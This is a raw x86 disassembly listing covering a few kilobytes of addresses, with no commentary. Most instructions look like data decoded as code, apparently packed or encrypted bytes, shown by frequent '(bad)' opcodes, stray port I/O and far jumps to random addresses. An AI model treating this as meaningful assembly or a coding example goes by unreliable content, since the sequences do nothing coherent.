  440cd5:	pop    ebp
  440cd6:	aam    0x7f
  440cd8:	mov    al,0x9f
  440cda:	add    eax,0xb83b8b00
  440cdf:	cmp    edx,DWORD PTR [ebp-0x5ff27a2b]
  440ce5:	adc    al,0xf4
  440ce7:	pop    ds
  440ce8:	add    BYTE PTR [eax],dl
  440cea:	cld    
  440ceb:	dec    ebx
  440cec:	jb     0x440caf
  440cee:	pop    ds
  440cef:	(bad)  
  440cf0:	mov    al,ds:0xa3d86fc0
  440cf5:	xchg   ecx,eax
  440cf6:	xor    eax,0x77482d9
  440cfb:	test   al,0xae
  440cfd:	daa    
  440cfe:	(bad)  
  440d00:	sbb    eax,0xeca5d3f1
  440d05:	mov    edi,0xa7d416c3
  440d0a:	retf   
  440d0b:	mov    DWORD PTR [ebx+ebx*8-0x35],eax
  440d0f:	enter  0x579a,0xf9
  440d13:	jbe    0x440d30
  440d15:	cmp    ah,bl
  440d17:	lods   eax,DWORD PTR ds:[esi]
  440d18:	xor    eax,0x9b160f32
  440d1d:	sbb    DWORD PTR [ebx+0x33cd9461],0x7f554098
  440d27:	inc    ecx
  440d28:	into   
  440d29:	add    dl,bl
  440d2b:	je     0x440d13
  440d2d:	adc    ch,bh
  440d2f:	pop    es
  440d30:	mov    esp,?
  440d32:	sbb    DWORD PTR [edi-0x4],0x8eb5d6a1
  440d39:	fild   DWORD PTR [eax+0x4ac4cdd2]
  440d3f:	pop    ds
  440d40:	loope  0x440da0
  440d42:	jnp    0x440d4c
  440d44:	sub    BYTE PTR [esi+edx*4+0x21afaaf6],bl
  440d4b:	pusha  
  440d4c:	sub    edx,esp
  440d4e:	mov    dh,0x81
  440d50:	adc    esp,esp
  440d52:	retf   0x9819
  440d55:	in     al,dx
  440d56:	ret    
  440d57:	push   edi
  440d58:	clc    
  440d59:	imul   ecx,DWORD PTR [ecx-0x208a8866],0xfffffffb
  440d60:	mov    edi,0x74d3bd0f
  440d65:	adc    bh,BYTE PTR [eax+0x4c7bd15b]
  440d6b:	and    esp,DWORD PTR [edx-0x4b]
  440d6e:	cmc    
  440d6f:	xchg   ebx,eax
  440d70:	outs   dx,BYTE PTR ds:[esi]
  440d71:	stos   DWORD PTR es:[edi],eax
  440d72:	retf   
  440d73:	xchg   esp,ecx
  440d75:	dec    esp
  440d76:	or     al,0x5e
  440d78:	sub    BYTE PTR [esi+0x23],cl
  440d7b:	dec    esp
  440d7d:	or     eax,0x4eb47851
  440d82:	lea    eax,[ecx+0x61530ced]
  440d88:	test   eax,0xe4bcdeb0
  440d8d:	mov    dl,0x60
  440d8f:	out    dx,eax
  440d90:	mov    ch,0x11
  440d92:	fst    DWORD PTR [edi]
  440d94:	out    0xfc,eax
  440d96:	push   esi
  440d97:	and    ecx,edx
  440d99:	lock loope 0x440d60
  440d9c:	ja     0x440df7
  440d9e:	test   ch,dl
  440da0:	mov    ebx,0x79141091
  440da5:	fcom   QWORD PTR ds:0x97393f2d
  440dab:	sub    DWORD PTR [eax],eax
  440dad:	and    BYTE PTR [esi+0x6929bd5],0x8c
  440db4:	imul   DWORD PTR [eax-0x75fba4e6]
  440dba:	cmp    eax,0xad91852c
  440dbf:	dec    ecx
  440dc0:	cmp    eax,0xc1194bc7
  440dc5:	f2xm1  
  440dc7:	xor    al,0x14
  440dc9:	repz scas eax,DWORD PTR es:[edi]
  440dcb:	dec    esi
  440dcc:	pop    ebx
  440dcd:	sbb    al,BYTE PTR [edi-0x3f]
  440dd0:	inc    ecx
  440dd1:	call   0x72407a82
  440dd6:	mul    DWORD PTR [ebp-0x7e]
  440dd9:	js     0x440d61
  440ddb:	pusha  
  440ddc:	popf   
  440ddd:	sbb    dl,al
  440ddf:	cmp    BYTE PTR [edi+0xccd78b8],ch
  440de5:	in     al,0xdf
  440de7:	push   ecx
  440de8:	pop    ebp
  440de9:	cld    
  440dea:	ins    DWORD PTR es:[edi],dx
  440deb:	out    0xc0,al
  440ded:	ror    BYTE PTR [edx+edi*1-0x4b],cl
  440df1:	js     0x440e61
  440df3:	pop    eax
  440df4:	shr    DWORD PTR [eax+0x33],cl
  440df7:	mov    cl,0x26
  440df9:	je     0x440dc0
  440dfb:	jne    0x440e4f
  440dfd:	clc    
  440dfe:	push   esp
  440dff:	push   edx
  440e00:	dec    edx
  440e01:	ss daa 
  440e03:	lea    edx,[ecx-0x5189e704]
  440e09:	dec    edx
  440e0a:	jge    0x440dc1
  440e0c:	mov    al,BYTE PTR [edi-0x52d05ced]
  440e12:	sti    
  440e13:	idiv   BYTE PTR [edx+0x14e972aa]
  440e19:	mov    al,ds:0x6b7498e4
  440e1e:	sar    BYTE PTR [edi],0xce
  440e21:	pop    es
  440e22:	push   edi
  440e23:	sbb    DWORD PTR [edi+0x47ccc42d],0x3d650e28
  440e2d:	ds pop edx
  440e2f:	or     dl,BYTE PTR ds:0x5336ff5d
  440e35:	sub    eax,ebp
  440e37:	xor    cl,ch
  440e39:	inc    bl
  440e3b:	add    DWORD PTR [ebp+0x7634cc30],0x6b12547c
  440e45:	fidiv  WORD PTR [ebx+0xd]
  440e48:	nop
  440e49:	xchg   BYTE PTR [edx-0x76],cl
  440e4c:	adc    eax,0xaaa8baa6
  440e51:	int    0xa5
  440e53:	jns    0x440e8d
  440e55:	mov    ds:0x23267e22,al
  440e5a:	lock ins DWORD PTR es:[edi],dx
  440e5c:	xlat   BYTE PTR ds:[ebx]
  440e5d:	mov    ebx,0x65d212d3
  440e62:	jp     0x440e47
  440e64:	dec    edx
  440e65:	cdq    
  440e66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440e67:	sub    esi,DWORD PTR [eax+0x13e715e3]
  440e6d:	fs jecxz 0x440e2f
  440e70:	sub    eax,0xeb15c649
  440e75:	pop    ebp
  440e76:	icebp  
  440e77:	cmp    bl,BYTE PTR [ebp-0x2d]
  440e7a:	cmp    BYTE PTR [ebp+0x359b63a8],dl
  440e80:	inc    ebx
  440e81:	push   ss
  440e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440e83:	inc    ebx
  440e84:	pop    sp
  440e86:	scas   al,BYTE PTR es:[edi]
  440e87:	mov    eax,ds:0x5f02b740
  440e8c:	jnp    0x440f03
  440e8e:	push   cs
  440e8f:	mov    edx,0x951ad5fc
  440e94:	rcl    DWORD PTR [ecx-0x9d914b3],0xd1
  440e9b:	adc    DWORD PTR [ebx-0x2ecc0d5d],ebx
  440ea1:	and    DWORD PTR [eax+0x78],esp
  440ea4:	xor    DWORD PTR [ecx+0x7f],ebp
  440ea7:	push   ebx
  440ea8:	cmp    cl,BYTE PTR [edx-0x5441b384]
  440eae:	out    dx,eax
  440eaf:	adc    eax,0x4746949f
  440eb4:	outs   dx,BYTE PTR ds:[esi]
  440eb5:	aas    
  440eb6:	in     eax,dx
  440eb7:	stos   DWORD PTR es:[edi],eax
  440eb8:	push   ecx
  440eb9:	or     BYTE PTR [edx],bl
  440ebb:	jo     0x440e5e
  440ebd:	lods   al,BYTE PTR ds:[esi]
  440ebe:	jae    0x440ee3
  440ec0:	test   BYTE PTR [edx],cl
  440ec2:	or     DWORD PTR [edx-0x4fd5dfa2],ecx
  440ec8:	bound  esi,QWORD PTR [esp+edi*2-0x626513a1]
  440ecf:	mov    cl,0xf
  440ed1:	lahf   
  440ed2:	dec    edx
  440ed3:	addr16 push es
  440ed5:	dec    esp
  440ed6:	test   BYTE PTR [edi-0x33],dh
  440ed9:	or     eax,0x3701164f
  440ede:	lds    ecx,FWORD PTR [ebx+0x3f]
  440ee1:	pusha  
  440ee2:	clc    
  440ee3:	and    eax,ecx
  440ee5:	pusha  
  440ee6:	xchg   esp,eax
  440ee7:	inc    eax
  440ee8:	imul   ecx,DWORD PTR [edx+0x6d],0xffffff83
  440eec:	(bad)  
  440eed:	ret    0x552c
  440ef0:	or     BYTE PTR [edx+0x69d443d9],dl
  440ef6:	dec    ebx
  440ef7:	sbb    al,0x5d
  440ef9:	xchg   esi,eax
  440efa:	fcom   DWORD PTR [esi+edx*2-0x54596965]
  440f01:	(bad)  
  440f02:	in     eax,0x5b
  440f04:	in     al,0x3a
  440f06:	lahf   
  440f07:	jae    0x440f23
  440f09:	test   eax,0x896c97da
  440f0e:	outs   dx,BYTE PTR ds:[esi]
  440f0f:	retf   
  440f10:	xor    eax,0x388bdd45
  440f15:	js     0x440ee2
  440f17:	call   0xf959ddd9
  440f1c:	mov    esi,0xa505cf6d
  440f21:	cli    
  440f22:	in     eax,dx
  440f23:	cmp    DWORD PTR [eax+0x9],edx
  440f26:	call   0xa8da405
  440f2b:	pop    ds
  440f2c:	push   esi
  440f2d:	push   ds
  440f2e:	shl    bh,1
  440f30:	inc    ebp
  440f31:	mov    edx,0x76f8e758
  440f36:	in     al,dx
  440f37:	retf   
  440f38:	mov    ch,0x83
  440f3a:	call   0xa536:0xda1ed9e7
  440f41:	leave  
  440f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440f44:	or     al,0xbf
  440f46:	xchg   DWORD PTR [esi+0x7593edce],ecx
  440f4c:	push   cs
  440f4d:	addr16 adc edi,esp
  440f50:	or     eax,0xb35a09ee
  440f55:	mov    ?,ebx
  440f57:	push   ecx
  440f58:	xor    BYTE PTR [edi],cl
  440f5a:	dec    ebp
  440f5b:	lods   al,BYTE PTR ds:[esi]
  440f5c:	xor    ebx,DWORD PTR ds:0xcee111dc
  440f62:	mov    BYTE PTR [edx+0x7a],bh
  440f65:	loop   0x440f14
  440f67:	ret    0xce4a
  440f6a:	jae    0x440f22
  440f6c:	mov    al,ds:0x3e965c55
  440f71:	sub    al,0x48
  440f73:	pop    esi
  440f74:	jmp    0xf6f7b0ec
  440f79:	push   edx
  440f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440f7b:	fdivr  DWORD PTR [eax]
  440f7d:	dec    ecx
  440f7e:	ror    DWORD PTR [esi],0x2b
  440f81:	and    al,0x2
  440f83:	adc    edi,DWORD PTR ds:0x5317572
  440f89:	xor    al,BYTE PTR [esi+0x14]
  440f8c:	cmp    DWORD PTR [esp+edx*1+0x17],ebp
  440f90:	(bad)  
  440f92:	lods   al,BYTE PTR ds:[esi]
  440f93:	stos   BYTE PTR es:[edi],al
  440f94:	xchg   edx,eax
  440f95:	pop    edx
  440f96:	fs (bad) 
  440f98:	sbb    cl,al
  440f9a:	inc    esp
  440f9b:	mov    ah,0xed
  440f9d:	ins    BYTE PTR es:[edi],dx
  440f9e:	mov    ch,0x5c
  440fa0:	sub    BYTE PTR [eax+0x50529659],0x6f
  440fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440fa8:	xor    DWORD PTR [ecx+0x364a5bc6],edi
  440fae:	sub    BYTE PTR [ebp-0x5ef800b0],ah
  440fb4:	mov    dh,0x31
  440fb6:	aaa    
  440fb7:	xor    bl,BYTE PTR [edi-0xd8f1dc6]
  440fbd:	or     al,0x9b
  440fbf:	cmp    al,0xea
  440fc1:	push   0x4f
  440fc3:	ja     0x440fa4
  440fc5:	jnp    0x440ff5
  440fc7:	std    
  440fc8:	push   ecx
  440fc9:	cld    
  440fca:	inc    ecx
  440fcb:	cwde   
  440fcc:	push   ebx
  440fcd:	ffree  st(1)
  440fcf:	retf   0x9aac
  440fd2:	es leave 
  440fd4:	mov    eax,0x8face933
  440fd9:	add    eax,0x8b412791
  440fde:	pop    ebp
  440fdf:	dec    edx
  440fe0:	xor    al,0x1a
  440fe2:	enter  0x601d,0x48
  440fe6:	mov    esi,0x9919a72b
  440feb:	in     eax,dx
  440fec:	out    0x4,al
  440fee:	pop    esp
  440fef:	xor    eax,0x37d46a12
  440ff4:	fsubr  DWORD PTR [ebx+0xe0f60be]
  440ffa:	add    cl,BYTE PTR [ebx+0xe]
  440ffd:	mov    bh,BYTE PTR es:[esi-0x15]
  441001:	jmp    0x440fc6
  441003:	jle    0x441080
  441005:	jge    0x440fc8
  441007:	fild   WORD PTR [ecx-0xc]
  44100a:	add    DWORD PTR [ebx+0x16b3fe4b],eax
  441010:	call   0xa6ac3df3
  441015:	xchg   esp,eax
  441016:	fistp  DWORD PTR [ebx-0xa]
  441019:	jmp    0x8641:0xa103ff89
  441020:	rcr    bl,0x78
  441023:	xchg   ecx,eax
  441024:	add    eax,0x2d70734
  441029:	(bad)  
  44102a:	mov    ah,0xe8
  44102c:	out    0x64,al
  44102e:	rol    BYTE PTR [ecx+0x7a6d183c],cl
  441034:	popa   
  441035:	sub    ebx,esp
  441037:	adc    dl,BYTE PTR [ecx]
  441039:	mov    cl,0xcb
  44103b:	js     0x440ff1
  44103d:	bound  edx,QWORD PTR [ebx+0x74108da0]
  441043:	cmp    BYTE PTR [ecx-0x38],al
  441046:	or     bh,BYTE PTR [ebx+0x118e2c2e]
  44104c:	ins    DWORD PTR es:[edi],dx
  44104d:	or     BYTE PTR [edi+0x1a],ah
  441050:	push   esp
  441051:	ror    BYTE PTR [edi+ecx*4],0xd0
  441055:	ficom  WORD PTR [ecx-0x45]
  441058:	sar    DWORD PTR [ebp+0x741a2b4b],0x93
  44105f:	stos   DWORD PTR es:[edi],eax
  441060:	jg     0x44101d
  441062:	mov    dh,0x55
  441064:	sub    esp,DWORD PTR [edi]
  441066:	loop   0x441019
  441068:	sub    eax,0xf1007e06
  44106d:	(bad)  
  44106e:	out    0xd7,eax
  441070:	ss out 0x24,eax
  441073:	jl     0x4410e6
  441075:	repz retf 
  441077:	add    al,0xe3
  441079:	repz inc edx
  44107b:	es mov bh,0x27
  44107e:	sbb    al,0xb2
  441080:	jl     0x4410ac
  441082:	mov    edi,0x8c290d0d
  441087:	or     DWORD PTR [esi-0x2f],ebp
  44108a:	jb     0x441034
  44108c:	sub    BYTE PTR [esi],dh
  44108e:	in     eax,0x2a
  441090:	lea    ecx,[eax]
  441092:	pop    ebp
  441093:	scas   al,BYTE PTR es:[edi]
  441094:	cmp    ecx,DWORD PTR ds:0x3fa01495
  44109a:	mov    bh,0x46
  44109c:	inc    ebp
  44109d:	inc    esi
  44109e:	add    al,0xa
  4410a0:	ja     0x441026
  4410a2:	icebp  
  4410a3:	pop    edx
  4410a4:	cmp    eax,0xd5b502a9
  4410a9:	icebp  
  4410aa:	push   cs
  4410ab:	lock iret 
  4410ad:	mov    ds:0x1b31146e,al
  4410b2:	jp     0x4410b7
  4410b4:	out    dx,eax
  4410b5:	outs   dx,BYTE PTR ds:[esi]
  4410b6:	and    eax,0x2262c3d5
  4410bb:	xor    ch,BYTE PTR [ecx]
  4410bd:	popf   
  4410be:	mov    al,ds:0x3bb801e5
  4410c3:	and    al,0x6
  4410c5:	je     0x44113c
  4410c7:	or     DWORD PTR [esi+ebp*2+0x5],esp
  4410cb:	mov    al,0x21
  4410cd:	inc    edx
  4410ce:	fld    TBYTE PTR [ecx-0x36e29f93]
  4410d4:	inc    ecx
  4410d5:	mov    esp,0x5675c6d0
  4410da:	cmc    
  4410db:	nop
  4410dc:	dec    BYTE PTR [ebx+0x62]
  4410df:	jp     0x441061
  4410e1:	das    
  4410e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4410e3:	pop    es
  4410e4:	xchg   esp,eax
  4410e5:	sti    
  4410e6:	mov    bh,BYTE PTR [edi+edi*2]
  4410e9:	outs   dx,BYTE PTR ds:[esi]
  4410ea:	cs data16 sbb al,0x34
  4410ee:	xchg   esi,eax
  4410ef:	pop    ecx
  4410f0:	cmove  eax,esp
  4410f3:	mov    ecx,0x4f3ac3a9
  4410f8:	inc    BYTE PTR [ebp+0x32746fe]
  4410fe:	push   0xd38fc76c
  441103:	addr16 imul ecx,edx,0xbe48dc0f
  44110a:	xchg   ah,bl
  44110c:	pop    es
  44110d:	push   edx
  44110e:	xchg   DWORD PTR [eax],edx
  441110:	mov    edi,0x5de1d623
  441115:	pop    ss
  441116:	sub    al,0x28
  441118:	dec    edi
  441119:	sbb    eax,0x68dee461
  44111e:	call   0x6c69:0x553d45c9
  441125:	xlat   BYTE PTR ds:[ebx]
  441126:	shl    edi,1
  441128:	sub    ah,ah
  44112a:	retf   
  44112b:	and    ah,ch
  44112d:	and    ecx,esp
  44112f:	add    esi,DWORD PTR [edi+ecx*4+0x360dfede]
  441136:	jnp    0x4410c6
  441138:	sar    BYTE PTR [ecx-0x46826e9e],1
  44113e:	sub    al,0x70
  441140:	mov    ebp,0x3cb36951
  441145:	inc    esi
  441146:	cmp    eax,0xc93ebc65
  44114b:	add    ebx,DWORD PTR [edi+0x1be81034]
  441151:	sbb    DWORD PTR [edx-0x207183d8],edx
  441157:	lock pop eax
  441159:	call   0x3b560aa8
  44115e:	lea    eax,[esi+edi*1]
  441161:	repz pop esi
  441163:	sub    cl,BYTE PTR [ecx+0x3bebfeac]
  441169:	sar    BYTE PTR [edx],cl
  44116b:	fstp   DWORD PTR [edx+ebp*8-0x4a96da0c]
  441172:	xchg   esp,eax
  441173:	xlat   BYTE PTR ds:[ebx]
  441174:	xchg   ecx,eax
  441175:	sbb    DWORD PTR ds:0x145dcec6,esp
  44117b:	xor    ch,cl
  44117d:	inc    edx
  44117e:	dec    eax
  44117f:	in     eax,0x63
  441181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441182:	and    bh,cl
  441184:	mov    bh,0x4b
  441186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441187:	xchg   ebp,eax
  441188:	jno    0x4411b1
  44118a:	rcr    BYTE PTR [edx],1
  44118c:	mov    eax,0x8573acdc
  441191:	dec    esp
  441192:	adc    BYTE PTR [ecx],0xa
  441195:	cwde   
  441196:	nop
  441197:	push   esi
  441198:	sub    BYTE PTR [eax+ebp*1],dh
  44119b:	push   esi
  44119c:	mov    edi,0xe40f4968
  4411a1:	adc    eax,0x61e7ae03
  4411a6:	test   DWORD PTR [edx+0x27],edi
  4411a9:	cdq    
  4411aa:	je     0x4411e6
  4411ac:	retf   
  4411ad:	iret   
  4411ae:	mov    gs,WORD PTR [eax+0x62ce1104]
  4411b4:	es (bad) 
  4411b6:	pop    eax
  4411b7:	push   es
  4411b8:	mov    al,ds:0x8f6a6a3e
  4411bd:	es push ecx
  4411bf:	and    ah,dl
  4411c1:	or     ebx,DWORD PTR [ecx]
  4411c3:	mul    DWORD PTR [eax+0x30]
  4411c6:	(bad)  
  4411c8:	sbb    esp,ecx
  4411ca:	fnsave [edi-0x14]
  4411cd:	push   cs
  4411ce:	cmp    BYTE PTR [eax+esi*8-0x38],0xa8
  4411d3:	xchg   BYTE PTR [esi],ch
  4411d5:	mov    bl,0x45
  4411d7:	cwde   
  4411d8:	pop    edx
  4411d9:	(bad)  
  4411da:	repnz add ch,BYTE PTR [ecx-0x334d80bb]
  4411e1:	sub    eax,0xddc0c8d8
  4411e6:	stc    
  4411e7:	inc    ebx
  4411e8:	(bad)
  4411ed:	dec    edx
  4411ee:	inc    ebx
  4411ef:	push   ds
  4411f0:	sub    ebx,edx
  4411f2:	nop
  4411f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4411f4:	mov    ds:0xd51da65d,eax
  4411f9:	je     0x441248
  4411fb:	(bad)
  4411fe:	pop    esi
  4411ff:	repnz and eax,0x738da9e6
  441205:	ucomiss xmm6,DWORD PTR [esi-0x6834e87f]
  44120c:	push   es
  44120d:	out    dx,al
  44120e:	xchg   BYTE PTR [edi+0x75edfad5],bh
  441214:	adc    cl,BYTE PTR [eax-0x16f6b945]
  44121a:	add    ebp,DWORD PTR [ebx+0x4217a083]
  441220:	fsub   QWORD PTR [esi-0x64]
  441223:	xor    DWORD PTR [eax+0xc],edi
  441226:	test   bl,ch
  441228:	jge    0x4411e8
  44122a:	mov    ebp,0xb707f116
  44122f:	jmp    0x44fd1e2f
  441234:	ret    0x24b6
  441237:	xor    dl,BYTE PTR [ecx+0x50e0e17b]
  44123d:	mov    eax,ds:0x1dd5c3e6
  441242:	jo     0x4411d0
  441244:	xlat   BYTE PTR ds:[ebx]
  441245:	enter  0xdb3d,0x79
  441249:	add    BYTE PTR [ebx],dh
  44124b:	jns    0x441219
  44124d:	(bad)  
  44124e:	shl    DWORD PTR [ecx],cl
  441250:	je     0x4412bb
  441252:	mov    eax,0x1b2aae8f
  441257:	shr    DWORD PTR [ecx+ecx*4],cl
  44125a:	call   0x31bf:0x9f6c1d7
  441261:	int3   
  441262:	xchg   ebx,eax
  441263:	jae    0x441230
  441265:	adc    ebx,DWORD PTR [edi-0x6981d64b]
  44126b:	int3   
  44126c:	neg    edi
  44126e:	icebp  
  44126f:	jp     0x4412c9
  441271:	jmp    0x4412c0
  441273:	mov    WORD PTR [ebp-0x68c3ea7d],es
  441279:	or     eax,0xc32832ce
  44127e:	lea    edi,[eax-0x3ca1ff9a]
  441284:	jmp    FWORD PTR [ebx+edx*2]
  441287:	push   edx
  441288:	bound  ecx,QWORD PTR [ebp-0x13]
  44128b:	popf   
  44128c:	mov    ebp,DWORD PTR [edx-0x18]
  44128f:	dec    ebx
  441290:	xor    ah,BYTE PTR [esi-0x7233326e]
  441296:	inc    eax
  441297:	add    BYTE PTR [eax+eiz*2],dh
  44129a:	sub    al,0x49
  44129c:	not    ebx
  44129e:	push   eax
  44129f:	inc    esi
  4412a0:	jnp    0x44130a
  4412a2:	rcl    DWORD PTR [edx],0x71
  4412a5:	cli    
  4412a6:	call   0x1dbe6285
  4412ab:	mov    ch,0x56
  4412ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4412ae:	or     ah,ah
  4412b0:	sbb    ch,bh
  4412b2:	std    
  4412b3:	neg    ah
  4412b5:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4412b7:	outs   dx,BYTE PTR ds:[esi]
  4412b8:	daa    
  4412b9:	sub    bl,dl
  4412bb:	out    0x7c,eax
  4412bd:	cmp    eax,DWORD PTR [edx]
  4412bf:	and    dl,BYTE PTR [ecx]
  4412c1:	daa    
  4412c2:	add    DWORD PTR [esi+0x79e38ce5],0x22
  4412c9:	and    eax,0x4dd714f9
  4412ce:	loope  0x4412be
  4412d0:	dec    edi
  4412d1:	inc    esp
  4412d2:	xchg   ebx,eax
  4412d3:	jmp    0x8b53:0x473b05f
  4412da:	and    BYTE PTR [eax-0x2d77c84b],dh
  4412e0:	and    BYTE PTR [ecx],ah
  4412e2:	jmp    0x44134d
  4412e4:	sbb    dh,bl
  4412e6:	test   edx,edi
  4412e8:	in     eax,dx
  4412e9:	xchg   edx,eax
  4412ea:	dec    ecx
  4412eb:	pushf  
  4412ec:	js     0x4412bd
  4412ee:	jge    0x441300
  4412f0:	mov    eax,ds:0xad041cde
  4412f5:	loop   0x441365
  4412f7:	add    eax,0x8f6863a1
  4412fc:	mov    ds:0x1a4257a6,eax
  441301:	fsub   st,st(4)
  441303:	push   eax
  441304:	pop    eax
  441305:	ins    BYTE PTR es:[edi],dx
  441306:	fcomp  DWORD PTR [ebp+0x3096b567]
  44130c:	in     al,0x21
  44130e:	bnd ret 
  441310:	fcom   DWORD PTR ds:0xe489f00c
  441316:	add    DWORD PTR [eax+0x61],0xffffff9a
  44131a:	in     eax,0x1e
  44131c:	mov    ecx,0xe78738d1
  441321:	pop    ebp
  441322:	mov    dl,0x71
  441324:	add    BYTE PTR [eax],ah
  441326:	jno    0x4412b0
  441328:	mov    bl,0xa3
  44132a:	test   ah,ch
  44132c:	jo     0x44132f
  44132e:	inc    esp
  44132f:	xor    al,0xcc
  441331:	jno    0x44136c
  441333:	push   0xdd176461
  441338:	test   BYTE PTR [ebp-0x4],cl
  44133b:	out    dx,al
  44133c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44133d:	into   
  44133e:	bnd jb 0x4412ea
  441341:	test   al,0x47
  441343:	inc    esp
  441344:	test   DWORD PTR [ecx+eiz*8+0x15],esi
  441348:	ret    0x445b
  44134b:	pop    ebp
  44134c:	mov    bh,BYTE PTR [eax]
  44134e:	jl     0x44131a
  441350:	mov    cl,0xde
  441352:	xchg   edi,eax
  441353:	cmc    
  441354:	in     eax,0xd3
  441356:	jae    0x4412f9
  441358:	loop   0x441382
  44135a:	adc    eax,0xef035783
  44135f:	mov    eax,ds:0xe8688d7d
  441364:	aaa    
  441365:	jmp    0xa5a52c3d
  44136a:	mov    ch,0x56
  44136c:	jne    0x44133f
  44136e:	loopne 0x441370
  441370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441371:	loop   0x4413b2
  441373:	xor    BYTE PTR [edx-0xfebd12a],bh
  441379:	adc    BYTE PTR [edx],bh
  44137b:	(bad)  
  44137d:	ret    0x5011
  441380:	sub    dl,BYTE PTR [eax]
  441382:	popf   
  441383:	stos   DWORD PTR es:[edi],eax
  441384:	and    al,0x8
  441386:	sbb    edx,esi
  441388:	push   0xffffff82
  44138a:	or     bl,BYTE PTR [ebx-0x173fb088]
  441390:	inc    eax
  441391:	xchg   ebp,eax
  441392:	mov    dh,dh
  441394:	adc    eax,0xc99eade
  441399:	loopne 0x4413c1
  44139b:	cmp    al,0xa2
  44139d:	fild   WORD PTR [eax+esi*2]
  4413a0:	sbb    al,0xf7
  4413a2:	add    dh,BYTE PTR [esi-0x4d]
  4413a5:	add    BYTE PTR [edi+0x233e1361],dl
  4413ab:	add    ecx,eax
  4413ad:	test   ah,0x5d
  4413b0:	(bad)  
  4413b2:	cli    
  4413b3:	xor    eax,0x27be7e80
  4413b8:	add    DWORD PTR [edi+0x1902434e],edi
  4413be:	and    ecx,ebx
  4413c0:	cmp    al,0xc2
  4413c2:	ja     0x441425
  4413c4:	push   edx
  4413c5:	ins    DWORD PTR es:[edi],dx
  4413c6:	aaa    
  4413c7:	leave  
  4413c8:	adc    esi,eax
  4413ca:	jo     0x44144b
  4413cc:	aam    0xd
  4413ce:	cdq    
  4413cf:	icebp  
  4413d0:	test   DWORD PTR [ecx+0x1f2fbeae],ebx
  4413d6:	add    DWORD PTR [eax],eax
  4413d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4413d9:	pop    ss
  4413da:	clc    
  4413db:	push   ecx
  4413dc:	scas   eax,DWORD PTR es:[edi]
  4413dd:	test   eax,0x3cea5431
  4413e2:	pop    ebp
  4413e3:	add    eax,0xaad41ffc
  4413e8:	mov    ebx,0x9a528236
  4413ed:	dec    ecx
  4413ee:	pop    edi
  4413ef:	push   ebp
  4413f0:	dec    esi
  4413f1:	(bad)  
  4413f2:	push   esi
  4413f3:	imul   esi,DWORD PTR [eax-0xa],0x45
  4413f7:	jo     0x441469
  4413f9:	rol    DWORD PTR [ebp+0x12184bc7],0x5
  441400:	add    BYTE PTR [edi-0x724bb270],cl
  441406:	stos   BYTE PTR es:[edi],al
  441407:	stc    
  441408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441409:	push   eax
  44140a:	mov    cs,WORD PTR [esi]
  44140c:	mov    ebx,0x10c6db
  441411:	sti    
  441412:	nop
  441413:	ror    DWORD PTR [edx-0x2f5d9c4b],1
  441419:	ins    BYTE PTR es:[edi],dx
  44141a:	imul   ecx,DWORD PTR [eax],0x76
  44141d:	or     bh,dh
  44141f:	adc    cl,BYTE PTR [ebp+0x1186d48d]
  441425:	and    esp,eax
  441427:	imul   ebx,DWORD PTR [esi+0x7],0x8d454c44
  44142e:	enter  0xfa7d,0xbf
  441432:	(bad)  
  441433:	or     BYTE PTR [edi],al
  441435:	sbb    esi,eax
  441437:	xlat   BYTE PTR ds:[ebx]
  441438:	js     0x441497
  44143a:	push   0xdd19d32d
  44143f:	ds dec edi
  441441:	cmovno ecx,DWORD PTR [ecx+0x20ca791f]
  441448:	icebp  
  441449:	js     0x441444
  44144b:	dec    esi
  44144c:	adc    DWORD PTR [esi-0x71958885],edx
  441452:	pop    DWORD PTR [esi+edx*1-0x2a]
  441456:	scas   eax,DWORD PTR es:[edi]
  441457:	pop    edx
  441458:	push   esp
  441459:	push   eax
  44145a:	cdq    
  44145b:	stos   DWORD PTR es:[edi],eax
  44145c:	adc    bl,BYTE PTR [ebx+eax*1+0x64]
  441460:	dec    edx
  441461:	push   ecx
  441462:	dec    esp
  441463:	sbb    eax,0xe17f4532
  441468:	daa    
  441469:	stc    
  44146a:	xchg   edx,eax
  44146b:	into   
  44146c:	shl    DWORD PTR [esi+0x7c],0x7e
  441470:	loop   0x441473
  441472:	and    DWORD PTR [esi+0x6d],esi
  441475:	mov    WORD PTR [edx-0x554b50fb],ss
  44147b:	sar    BYTE PTR [esi],cl
  44147d:	cdq    
  44147e:	push   edx
  44147f:	loopne 0x4414b9
  441481:	sub    al,0xc0
  441483:	mov    ebp,0x660c5095
  441488:	outs   dx,BYTE PTR ds:[esi]
  441489:	nop
  44148a:	int    0x2a
  44148c:	sub    DWORD PTR [edx+0x29faa742],0x93b840ac
  441496:	sbb    BYTE PTR [ebx],ch
  441498:	shl    DWORD PTR [eax-0x71],0xa5
  44149c:	es ja  0x4414dc
  44149f:	popa   
  4414a0:	loope  0x4414c1
  4414a2:	fcomp  DWORD PTR [ebp-0x1d]
  4414a5:	(bad)  
  4414a6:	stos   BYTE PTR es:[edi],al
  4414a7:	in     al,0x95
  4414a9:	rol    DWORD PTR [esi-0x5cb36f],0x33
  4414b0:	mov    ebx,0x91c19dd5
  4414b5:	inc    edi
  4414b6:	not    DWORD PTR [edi]
  4414b8:	fisttp QWORD PTR [ecx-0x50]
  4414bb:	(bad)  
  4414bc:	or     eax,0xa7308b21
  4414c1:	clc    
  4414c2:	sub    BYTE PTR [edx-0x5e213172],dl
  4414c8:	pop    esi
  4414c9:	(bad)  
  4414ca:	js     0x4414cb
  4414cc:	or     al,0xaf
  4414ce:	push   0x23e460c3
  4414d3:	mov    esp,0x2314f895
